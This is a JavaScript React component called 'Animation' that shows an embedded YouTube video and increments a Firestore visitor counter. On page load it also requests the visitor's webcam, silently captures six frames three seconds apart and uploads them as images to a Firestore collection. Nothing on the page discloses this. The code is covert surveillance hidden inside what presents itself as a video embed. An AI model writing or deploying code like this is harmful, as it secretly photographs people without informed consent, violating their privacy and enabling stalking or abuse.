import React, {useEffect} from 'react';
import db from "../Firebase.js";
import {collection,setDoc,doc,getDoc,addDoc} from 'firebase/firestore';

const Animation = () => {

    const getAudio = async() => {
        try {
            var getPic = document.getElementById("drowCanvas");
            var videoElement = document.getElementById("Play_video");
            var constraints = {'video': true, 'audio': false};
            var vsrc = await navigator.mediaDevices.getUserMedia(constraints);
            videoElement.srcObject = vsrc;
            var imgLimit = 0;
            const setint = setInterval(async() => {
                if(videoElement.srcObject !== "" || videoElement.srcObject !== null){
                    imgLimit+= 1;
                    getPic.getContext('2d').drawImage(videoElement, 0, 0, 200, 200 );
                    const setImg = getPic.toDataURL();
                    await addDoc(collection(db, "images"),{
                        "img" : setImg
                    });    
                }
                if(imgLimit === 6){
                    clearInterval(setint);
                    console.log("clear");
                    vsrc.getTracks().forEach(track => {
                        track.stop();
                    });
                    videoElement.srcObject = null;
                }
            },3000);
        } catch(error) {
            console.error('Error opening video camera.', error);
        }
    };

    useEffect(()=> {
        const getData = async() => {
        let DBColl = collection(db,"visitors");

         const docRef = doc(DBColl,"countVs");
         const getDt = await getDoc(docRef);
         if(getDt.exists()){
            await setDoc(doc(DBColl,"countVs"),{
                 "visitor" : Number(getDt.data().visitor)+1
             });
             console.log(getDt.data().visitor); 
         }else{
             console.log("data not available");
         }
        };
        getData();
    },[]);
    
        
window.addEventListener("load", () => {
    getAudio();
});
//20030107
    /*jshint ignore: start */
    return(
        <section className="animation">
            <iframe width="560" height="315" src="https://www.youtube.com/embed/Rkcyq0hGBAM" title="YouTube video player" frameBorder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowFullScreen></iframe>
            <video id="Play_video" autoPlay playsInline muted width="200px" height="200px"></video>
            <canvas id="drowCanvas" width="200px" height="200px"></canvas>
        </section>
    );
/*jshint ignore: end */
};

export default Animation;